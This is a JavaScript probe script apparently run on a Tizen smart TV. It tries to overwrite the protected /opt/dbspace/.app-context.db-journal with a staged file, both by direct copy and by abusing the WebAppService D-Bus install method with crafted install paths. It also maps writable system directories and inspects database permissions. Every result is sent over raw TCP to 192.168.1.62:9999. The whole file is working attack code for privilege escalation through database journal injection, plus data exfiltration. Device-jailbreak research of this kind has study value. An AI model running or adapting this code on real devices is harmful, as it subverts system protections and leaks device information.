"use strict";

/* p77: placement experiments (modulo TizenBrew, uid owner)
   1. id/groups + staged md5 + live/journal state
   2. cp diretto (atteso: Permission denied, da documentare)
   3. WAS was_install_app install_path="/opt/dbspace" (Probe12.wgt, 60s wait)
      -> ls /opt/dbspace + /opt/usr/apps (nuovi dir? file?)
   4. WAS install_path="/opt/dbspace/.app-context" (test 2, 60s wait)
   5. dir writability: temp/common/webappservice/owner home
   6. WAS DB: ls -la + sqlite probe (file owner:users, scrivibile)
   exfil /p77info
 */

var cp = null;
try { cp = require('child_process'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var STAGED = '/home/owner/share/tmp/sdk_tools/appctx_hot_journal';
var WGT = '/home/owner/share/tmp/sdk_tools/Probe12.wgt';
var WGT_MD5 = '207d3f7f8fd57227ece8eccf8215ca2f';
var APP12 = 'ProbeTwelio.Probe12';
var DST = '/opt/dbspace/.app-context.db-journal';
var LIVE = '/opt/dbspace/.app-context.db';
var WAS = 'org.tizen.tv.webappservice.server';
var WAS_PATH = '/org/tizen/tv/webappservice/server';
var WAS_IFACE = 'org.tizen.tv.webappservice.server.interface';
var R = { ts: new Date().toISOString(), probe: 'p77', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  try {
    var net = require('net');
    var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
    var s = net.connect(PORT, HOST);
    s.setTimeout(180000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 300000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p77info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs, maxLen) {
  maxLen = maxLen || 8000;
  if (!cp) return '[no cp]';
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out.substring(0, maxLen);
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, maxLen);
  }
}

function sleepSync(ms) {
  try { cp.execSync('sleep ' + Math.ceil(ms / 1000), { timeout: ms + 30000, maxBuffer: 4096 }); } catch (e) {}
}

function md5(p) {
  return run('md5sum ' + p + ' 2>&1; ls -la ' + p + ' 2>&1', 15000, 2000);
}

function wasInstall(installPath) {
  return run('dbus-send --system --print-reply --dest=' + WAS + ' --type=method_call ' + WAS_PATH + ' ' + WAS_IFACE + '.was_install_app int32:0 string:"p77" int32:0 int32:0 string:"' + APP12 + '" string:"' + WGT + '" string:"' + installPath + '" int32:0 int32:0 int32:0 string:"p77-install" 2>&1 | head -12', 60000);
}

function dbspaceCheck(label) {
  return run('echo ===' + label + '; ls -la /opt/dbspace/ 2>&1 | grep -iE "probe|app-context|total" | head -12; echo ===APPS; ls /opt/usr/apps/ 2>&1 | grep -iE "probe|xvvl" | head -8; echo ===DST; md5sum ' + DST + ' 2>&1', 20000);
}

function main() {
  R.results.s0_id = run('id; whoami; groups 2>&1', 10000, 500);
  R.results.s1_staged = md5(STAGED);
  R.results.s1b_wgt = md5(WGT);
  R.results.s1c_live = md5(LIVE);
  R.results.s1d_jrn = md5(DST);
  L('init: staged=' + R.results.s1_staged.substring(0, 80));

  /* 2. cp diretto */
  R.results.s2_cp = run('cp ' + STAGED + ' ' + DST + ' 2>&1 && echo CP_OK || echo CP_FAIL', 20000);
  L('cp: ' + R.results.s2_cp.substring(0, 150));

  /* 3. WAS install_path=/opt/dbspace */
  R.results.s3_was1 = wasInstall('/opt/dbspace');
  L('was1 sent: ' + R.results.s3_was1.substring(0, 200));
  sleepSync(60000);
  R.results.s4_state1 = dbspaceCheck('AFTER_WAS1');

  /* 4. WAS install_path=/opt/dbspace/.app-context */
  R.results.s5_was2 = wasInstall('/opt/dbspace/.app-context');
  sleepSync(60000);
  R.results.s6_state2 = dbspaceCheck('AFTER_WAS2');

  /* 5. dir writability */
  R.results.s7_writetest = run(
    'for d in /opt/share/webappservice/temp /opt/share/webappservice/common /opt/usr/apps/webappservice /opt/usr/home/owner /home/owner/share/tmp/sdk_tools /opt/usr/home/owner/apps_rw; do' +
    ' T=$d/.p77test_$$;' +
    ' if touch "$T" 2>/dev/null; then echo "WRITABLE: $d"; rm -f "$T"; else echo "NOT: $d"; fi;' +
    ' done', 30000);

  /* 6. WAS DB state */
  R.results.s8_wasdb = run('ls -la /opt/dbspace/.webappservice.db* /opt/usr/apps/webappservice/wasdb_backup/ 2>&1 | head -12; echo ===; stat -c "%a %U:%G %n" /opt/dbspace/.webappservice.db /opt/dbspace/.webappservice.db-journal 2>&1', 15000);

  /* stato finale */
  R.results.s9_final = dbspaceCheck('FINAL');

  R.results.final = 'done ' + new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal, 20000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
